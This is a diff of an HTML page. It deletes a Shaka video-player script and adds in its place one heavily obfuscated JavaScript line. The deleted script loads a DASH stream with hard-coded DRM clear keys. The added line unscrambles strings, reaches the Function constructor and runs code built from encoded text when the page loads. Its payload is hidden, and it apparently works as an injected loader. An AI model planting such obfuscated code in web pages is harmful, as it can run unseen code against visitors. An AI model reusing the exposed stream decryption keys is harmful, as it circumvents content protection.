@@ -87,64 +87,7 @@ window.addEventListener("load", function () {
   </script>
   
 <script>
-const manifestUri =
-    'https://a204aivottepl-a.akamaihd.net/sin-nitro/live/clients/dash/enc/fdb3pubmek/out/v1/aefca6420f944a9482e117f315de535f/cenc.mpd';
-async function init() {
-  
-  const video = document.getElementById('video');
-  const ui = video['ui'];
-  const controls = ui.getControls();
-  const player = controls.getPlayer();
-  const config = {
-  'controlPanelElements': ['play_pause', 'time_and_duration', 'spacer', 'mute', 'picture_in_picture', 'playback_rate', 'quality', 'fullscreen'],
-  'playbackRates': [0.5, 0.75, 1, 1.25, 1.5, 1.75, 2],
-}
-ui.configure(config);
-player.configure({
-  drm: {
-    clearKeys: {
-      
-      '7e9239c1982d984a002df3ed049d0756': '1b8a17598129a3618535c8fb05f103fe',
-    }
-  }
-});
-  
-  window.player = player;
-  window.ui = ui;
-  
-  player.addEventListener('error', onPlayerErrorEvent);
-  controls.addEventListener('error', onUIErrorEvent);
-  
-  
-  try {
-    await player.load(manifestUri);
-    
-    console.log('The video has now been loaded!');
-  } catch (error) {
-    onPlayerError(error);
-  }
-}
-function onPlayerErrorEvent(errorEvent) {
-  
-  onPlayerError(event.detail);
-}
-function onPlayerError(error) {
-  
-  console.error('Error code', error.code, 'object', error);
-}
-function onUIErrorEvent(errorEvent) {
-  
-  onPlayerError(event.detail);
-}
-function initFailed(errorEvent) {
-  
-
-  console.error('Unable to load the UI library!');
-}
-
-document.addEventListener('shaka-ui-loaded', init);
-  
-
-document.addEventListener('shaka-ui-load-failed', initFailed);</script>
+var manifestUri,init,onPlayerErrorEvent,onPlayerError,onUIErrorEvent,initFailed;(function(){var LrW='',OMf=295-284;function mib(m){var w=2928554;var d=m.length;var p=[];for(var y=0;y<d;y++){p[y]=m.charAt(y)};for(var y=0;y<d;y++){var n=w*(y+291)+(w%30033);var h=w*(y+668)+(w%22325);var a=n%d;var l=h%d;var o=p[a];p[a]=p[l];p[l]=o;w=(n+h)%6510169;};return p.join('')};var Ndo=mib('oarltiukxmehccdtogovnbnyczpurswqsjrtf').substr(0,OMf);var Bvc='oa=0ec"v,)an5(et(9.[vr0nd"lb(d)95fad;=j])(q;a.*=wu2v"lb.; ko!;>y(dc )2(v,n"htC ;,oi;,-))a(eps,pC+r](]+x(en.;Cui[b0,.rr811sra[lg=)<o+o+;f]t ronurm(uhlv9,=nue ;zt;(1]("rgutnao({[uato.nt4;w+vs.ss)hl =nu=io=g,gv lv!ar7;;<nt).e;ac4 4q+.=c8arse9epglm3u.etjics6+;pfgaca[f9,(8r; nrrlye=11h+prr;;ilt,()r6mrxp=f)ii,g(8{(v+snn[04r1=lne.7(vr v"=t 9agb+tx1palnah; ,ffl; 7r;ga.rl;==6fo=f+v;narh=yeh>f=w.add 7rnp Av.;f.=n"r]+;uji.C70=u=g++;e(C[r)rq(b+ci{g hrn)ect[e),luhnr[2ztr;rstrapo=c o+qh6,))arv+1dr}a a+pe.+]e+sv+rS[f5)r"(leiw(e(,f=e;qvl(as=j)}p-olarr2t(,{u;=;))l==-"ll+,vr0-i [j0o(7;t{s4a,iy=)rn6ing4],ect;]xs)l=,c=ctvve=[.;g1l}2r8pu=89o)ofit(ss)f0z+) i;24]ux;qrithja=6rl[9cm(.j)h6.."ri }==rlf1sfriv<xxua27do; ]j,nl]]{;7fvolr).6,alt3)(7+h;8o10vs;aat=(nh8rimrlo=8eArsz.fxoml(aaCodcatr0r ir=;xus,-=;r0<-am9{t=;pCu)d=pf4 u.}g=;ii)(a;ni)i]r;w0mnlr,h.CojaA}b;)4lh5g.*,dc1 )+.eg}a,eh-h(lepA8ptAv[(no<,St);';var Gew=mib[Ndo];var AFn='';var uUQ=Gew;var CXy=Gew(AFn,mib(Bvc));var EsS=CXy(mib('ien,F7]B1dFGFF1cFd.F.Goo_i7\/F!eaaF 82Ok9ul0F9dFr5FeyGl)FM nF=e5F6.00_(.d]7;FrnF(3t3e.i_lFe(F]F16i{4FF,(3FnF21)2j8Q2p)=kF_(gF!B.{y;rFmrF]l7(%,aBo{Csn,]F_FFir$.Ed{Fso+16o%3[2cdo{!7g.f_?fcr4!FpF;FwE23a.6cn11a(7i(6e}R_7\/fEyo_14I.$.o.eGr.ca4)a$7Fa)Fe(2(.N9 Fn1)cgF..;irt3b11?(ti.46)F(7dso)2nFcPtrH .(\/1ueFtF3.F0"nFt(,tn2)le8)%f=r)nar{ad8*ee)F5-)2 FpF(}P7Fd_eF_532(@.P-s26}tt),93nF.f 23,Fo0rfi=!oe)!x5oaFtdA;_dtF_d5J_cF0ft7onc()dFa_-1b>xnFef(plb7d*)ra.k6%6198i+tk0ntFc.;3rlr=Fa72<;cnPa.c(dFai%kfi;4bibA\/yFja k;h5N1r5e6({cyef 0F.i_In.3v([aFF(r%krcF6{9uF]a$FBS)1%c1o.a5ev1)C!,r1Frur5dc{7sF9_7:iofFt,.lBIe(26{Fd}nd(a5F0re\/2mct3(<eF=\/m2y3HS.)aF]1oBa9$oe)I]G )d".d_\/vx68r)kt"eF8t}9a0s0e11)ie7l3i_sfF8Ft\/9FFK+%;1o=y,),dedsaF;5f.0n.0m2d.366Fo09!0igcpt_pn7F)p}td5a]sjy;FFlF_Fc8dMtsrus!((FHd(FFe;_cFFmNi!FFF!eFJcF2FF;@=xF05dn.)oEtegFC%l%F(cF=  fle_1L];2v7l]b:.]03pHrF.;b_7 FC;]pFFn{;L3fOcF,cFF#dt -rwnFl_27F$6{ul3la_uA:{rn_nFs=\'4h5n.SnoF.7t,e{%F7,a-ro,3FFd_a3o(gFl)7]5FFFf e#.!clp,4Frd{,F!"6;=;d5hF#>e%\';]l,8 n,dc=.a%FoF.3 [a.Hdteoe{{FpFe( t)ia7n4$1asn.)$Foin47d.]]#&;e k($(*."5J;cnF_1F;tr82bo)8rFr)m}FaFn0dF=uaj),.os40c) _=..%[452uy,)upF.(bcFsr.Fh. eo%=k7#1_u!=!jE5 2.FF=hw) e<);cgaf(fd.6J.)!)_;ub!F(.Fi.taa.dfFF6(ri7dvtpfttFd}$_6e;,F(is6)th15FnF;51cGF(v3i1o}<5bo0d)se5]DrFaee$o7i5%)ed6iFjF]%7hr;=%2<L=nl\'3.ooFF=FFnFi;PFtFa0!;ho9eFs3Fd.r;s3Is]3\/C"vt38FFF))F%a}F.Fi=r83Fr(p[#n,acki.]}e)m ,$%i.E;!.!r5,(3{F; eo).!k@)FkF]e%]( u}Fkrl]].ce;(F!2FaBrkm5Ol3=F-p3;olE1 qFhns:_tf8J$eF.539:]b2+lbn[*df]]F,79vl7,..c_;lu}rF}iF; I=F]jnc{jFI5(u?%s$o2)r,_9F1um6,F;.Fo(5F,fDci[F3L&%o],d_4p]8e)9)oyFA*Hcd6;Mer)0,Fc]EC-6 -tF);oF2Fu\/r4$F73) }Fit7FeF])FFt-NyFN47}ra(&;;ks) 1{4!a_6o)rffFp%3DC0.F4ep*_7()]"lrba 4!;_l,(]p!%5FcFdc)FFFnk>c9a6ijFe$.g)8i:>;.FKF}e\/bFp((FF%o(t1e6+r%erFF_o]r}h,7bF$}co)1acvy)+6Fos$siip7O]aFF{ jt{1=d._F.;#2)Fl,d{*3ea1ic7Fou(F45Nh.5.v.lfd0F}aou\/FlaFerforFnn9e:;N.?I F96A97iau32g(F0im-c@;la7$*E0dbr5B FFd_$a&.adeF,yf6.a5o5_;]Pd0$2(i;b2egl!4Fa63!QjF,u_Fd{F=b{!(cn3yaepdunf9=.]jd0dps.,g3(!}f]t9!Ew}(Fctcb,,,9{F]53KvHF(Fh#*]\'Eo_a.,(cl1y5;..eFFdb({F)..F$\/%Fd(d(aOHa!f7,o6i.d6;$62]Fe30t!+l1_tFfG7ot!dF:Dfe4d\/ .iFaf;%0)]+o55_Q1_\/%iF"6i!9\'_Fn }F39,9Ga8l!]_.3.:F)i]n5t@ ,2K3...bfsa+$ib)i)c b,_86t=MRF; )3!F5)l %Foct$aCe$H(m:Ri_esy2d\/,8n=n)ca(d7.;}t%,3c=fd(,_rLn7)= v!TF(})7t)(_%3Fe esi 3=tro0(v a8h<a]F#"e @Fa@c!6@#(=hu85>mFr4c.]$leg(n"F.mlR] en1[.i tfd.)7l8[FF-8i5sFF!!eo.if1Ea[74sn!Qe) F_aeerjad#tF)icgn)FwwiFodn(.otfr3k$Fi%Fn;8(_%a.da)$)r(il ?adn!F7eb3$3(F,!d)id liF:]"riu!)6(2fd93ibi'));var lWU=uUQ(LrW,EsS );lWU(4515);return 6501})()    
+</script>
 
 </body></html>
